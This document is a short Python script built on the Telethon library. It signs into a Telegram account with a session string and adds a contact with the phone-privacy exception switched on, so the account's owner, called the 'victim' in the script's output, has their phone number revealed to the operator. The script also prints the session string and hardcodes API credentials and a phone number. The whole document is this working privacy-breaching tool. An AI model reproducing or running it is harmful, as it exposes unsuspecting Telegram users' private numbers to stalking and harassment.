from telethon import TelegramClient, events, sync
from telethon.sessions import StringSession
from telethon import functions
api_id = 10953300
api_hash = "9c24426e5d6fa1d441913e3906627f87"
string = input('session code or press enter: ')




with TelegramClient(StringSession(string), api_id, api_hash) as client:
    print(client.session.save(),'\n')
    
    result = client(functions.contacts.AddContactRequest(
        id=input("username: "),
        first_name='satomoru',
        last_name='satori',
        phone='+998900677719',
        add_phone_privacy_exception=True
    ))


client.start()
print(
    "\033[1;32mThe program has started and you can see the victim's number by logging into your account\n\nTelegram: @py_024")
client.run_until_disconnected()

